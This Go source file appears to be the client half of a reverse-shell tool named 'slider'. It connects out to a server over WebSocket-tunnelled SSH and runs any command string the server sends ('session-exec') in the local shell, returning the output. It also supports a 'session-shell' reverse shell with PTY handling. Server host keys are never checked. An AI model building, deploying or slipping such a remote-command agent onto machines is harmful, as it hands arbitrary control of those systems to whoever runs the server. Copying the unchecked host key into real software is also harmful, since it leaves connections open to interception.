package client

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"slices"
	"slider/pkg/interpreter"
	"slider/pkg/sconn"
	"slider/pkg/slog"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

type client struct {
	*slog.Logger
	serverAddr     string
	timeout        time.Duration
	wsConfig       *websocket.Dialer
	httpHeaders    http.Header
	sshConfig      *ssh.ClientConfig
	sshSession     *ssh.Session
	sshClientConn  ssh.Conn
	sshChannel     ssh.Channel
	interpreter    *interpreter.Interpreter
	ptyFile        *os.File
	connReqChannel <-chan *ssh.Request
	debug          bool
	disconnect     chan bool
}

func NewClient(args []string) {
	c := client{
		Logger: slog.NewLogger("Client"),
	}

	f := flag.NewFlagSet("client", flag.ContinueOnError)
	f.BoolVar(&c.debug, "debug", false, "Verbose logging.")
	f.DurationVar(&c.timeout, "timeout", 60*time.Second, "Set keepalive timeout in seconds.")
	if parsErr := f.Parse(args); parsErr != nil || slices.Contains(f.Args(), "help") {
		f.Usage()
		return
	}

	if c.debug {
		c.Logger.WithDebug()
	}

	// Set interpreter
	i, err := interpreter.NewInterpreter()
	if err != nil {
		c.Fatalf("%s", err)
	}
	c.setInterpreter(i)

	args = f.Args()
	c.serverAddr = args[0]

	c.wsConfig = &websocket.Dialer{
		NetDial:          nil,
		HandshakeTimeout: 60 * time.Second,
		Subprotocols:     nil,
		// Use Default Buffer Size
		ReadBufferSize:  0,
		WriteBufferSize: 0,
	}

	// TODO: Provide Key authentication to the server if requested with flag otherwise fallback insecure
	c.sshConfig = &ssh.ClientConfig{
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		ClientVersion:   "SSH-slider-client",
		Timeout:         60 * time.Second,
	}

	// Check the use of extra headers for added functionality
	// https://developer.mozilla.org/en-US/docs/Web/HTTP/Protocol_upgrade_mechanism
	c.httpHeaders = http.Header{}

	wsConn, _, err := c.wsConfig.DialContext(context.Background(), fmt.Sprintf("ws://%s", c.serverAddr), c.httpHeaders)
	if err != nil {
		c.Fatalf("Can't connect to Server address: %s", err)
		return
	}

	netConn := sconn.WsConnToNetConn(wsConn)

	var reqChan <-chan *ssh.Request
	var newChan <-chan ssh.NewChannel
	var connErr error

	c.sshClientConn, newChan, reqChan, connErr = ssh.NewClientConn(netConn, c.serverAddr, c.sshConfig)
	if connErr != nil {
		c.Fatalf("%s\n", connErr)
		return
	}
	defer func() { _ = c.sshClientConn.Close() }()
	c.Debugf("Session %v\n", c.sshClientConn.SessionID())

	c.disconnect = make(chan bool, 1)

	if c.timeout > 0 {
		go c.keepAlive(c.timeout)
	}

	go c.handleGlobalChannels(newChan)
	go c.handleGlobalRequests(reqChan)

	<-c.disconnect
	close(c.disconnect)
}

func (c *client) handleGlobalChannels(newChan <-chan ssh.NewChannel) {
	for nc := range newChan {
		var err error

		switch nc.ChannelType() {
		default:
			c.Debugf("Rejected channel %s", nc.ChannelType())
			if err = nc.Reject(ssh.UnknownChannelType, ""); err != nil {
				c.Warnf("handleSSHnewChannels (session): Received Unknown channel type.\n%s",
					err,
				)
			}
			return
		}
	}
}

func (c *client) handleGlobalRequests(requests <-chan *ssh.Request) {
	for req := range requests {
		switch req.Type {
		case "keep-alive":
			if err := c.replyConnRequest(req, true, []byte("pong")); err != nil {
				c.Errorf("Error sending \"%s\" reply to Server - %s", req.Type, err)
			}
		case "session-exec":
			c.Debugf("Received \"%s\" Connection Request", req.Type)
			go c.sendCommandExec(req)
		case "session-shell":
			go c.sendReverseShell(req)
		case "window-change":
			// Server only sends this Request if Interpreter is PTY,
			// after Reverse Shell is sent, ergo PTY File has been created
			c.Debugf("Server Requested window change: %s\n", req.Payload)
			var termSize interpreter.TermSize
			if err := json.Unmarshal(req.Payload, &termSize); err != nil {
				c.Fatalf("%s", err)
			}
			c.updatePtySize(termSize.Rows, termSize.Cols)
		case "disconnect":
			c.Debugf("Server requested Client disconnection.")
			_ = c.replyConnRequest(req, true, []byte("disconnected"))
			c.disconnect <- true
		default:
			c.Debugf("Received unknown Connetion Request Type: \"%s\"", req.Type)
			_ = req.Reply(false, nil)
		}
	}
}

func (c *client) setInterpreter(i *interpreter.Interpreter) {
	c.interpreter = i
}

func (c *client) sendCommandExec(request *ssh.Request) {
	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
	if openErr != nil {
		c.Errorf("failed to open a \"session\" channel to server")
		return
	}
	defer channel.Close()

	rcvCmd := string(request.Payload)
	c.Debugf("Received - Bytes Payload: %v, Command: \"%s\"", request.Payload, rcvCmd)

	cmd := exec.Command(c.interpreter.Shell, append(c.interpreter.CmdArgs, rcvCmd)...) //nolint:gosec

	out, _ := cmd.CombinedOutput()
	_, cwErr := channel.Write(out)
	if cwErr != nil {
		c.Errorf("failed to write command \"%s\" output into channel", rcvCmd)
	}

	// Notify Server we are good to go
	if err := c.replyConnRequest(request, true, []byte("exec-ready")); err != nil {
		c.Errorf("failed to send reply to request \"%s\"", request.Type)
	}
}

func (c *client) keepAlive(keepalive time.Duration) {
	ticker := time.NewTicker(keepalive)
	defer ticker.Stop()

	for {
		select {
		case <-c.disconnect:
			c.Debugf("[KeepAlive] Stopping Ping to server.")
			return
		case <-ticker.C:
			_, p, sendErr := c.sendConnRequest("keep-alive", true, []byte("ping"))
			if sendErr != nil || !bytes.Equal(p, []byte("pong")) {
				c.Errorf("[KeepAlive] Lost connection to Server.")
				c.disconnect <- true
				return
			}
		}
	}
}

func (c *client) sendConnRequest(reqType string, wantReply bool, payload []byte) (bool, []byte, error) {
	c.Debugf("Sending Connection Request Type \"%s\" with Payload: \"%s\"", reqType, payload)
	return c.sshClientConn.SendRequest(reqType, wantReply, payload)
}

func (c *client) replyConnRequest(req *ssh.Request, reply bool, payload []byte) error {
	c.Debugf("Replying Connection Request Type \"%s\" with Payload: \"%s\"", req.Type, payload)
	return req.Reply(reply, payload)
}

func (c *client) sendSessionRequest(sshSession *ssh.Session, requestType string, ok bool, payload []byte) error {
	okR, err := sshSession.SendRequest(requestType, ok, payload)
	if err != nil {
		return fmt.Errorf("%s %s", requestType, err)
	}
	c.Debugf("Sent Session Request \"%s\", received: \"%v\" from server.\n", requestType, okR)
	return nil
}
